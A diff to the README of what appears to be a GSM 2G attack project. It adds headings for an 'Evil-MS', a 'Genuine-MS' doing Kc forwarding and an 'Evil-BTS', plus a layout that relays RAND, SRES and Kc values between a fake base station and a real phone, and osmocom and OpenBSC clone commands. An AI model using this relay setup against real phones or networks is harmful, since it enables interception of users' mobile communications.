@@ -548,7 +548,7 @@ Targets android < 12, telco 2G until 2025 in France
 Thank for reading !
 
 clients-servers architecture :
-
+```
 bsc-2rfa 172.17.0.2
 server rand 888 listen on 0.0.0.0
 client sres 666 -> 172.17.0.3
@@ -560,8 +560,8 @@ server kc 777 listen on 0.0.0.0
 
 osmocom-genuine-ms 172.17.0.2
 client kc 777 -> 172.17.0.3
-
-
+```
+`
 suppress_space.h
 ```c
 nclude <stdio.h>
@@ -742,6 +742,9 @@ char* catch_sres(){
   return text;
 }
 ```
+
+Evil-MS :
+
 ```bash
 git clone https://github.com/osmocom/osmocom-bb
 git checkout fc20a37cb375dac11f45b78a446237c70f00841c
@@ -830,7 +833,7 @@ diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rf
 ```
 
 
-
+Genuine-MS (Kc Forwarding)
 Patch osmocom-bb
 
 ```bash
@@ -906,7 +909,8 @@ diff -ru trx/src/host/layer23/src/mobile/subscriber.c osmocom-bb/src/host/layer2
  
  	/* return signed response */
 ```
-Patch OpenBSC :
+Patch OpenBSC Evil-BTS:
+
 ```bash
 git clone https://github.com/osmocom/openbsc
 git checkout 3f457a3b79e2908664b40eab9ca8e70c44a54898
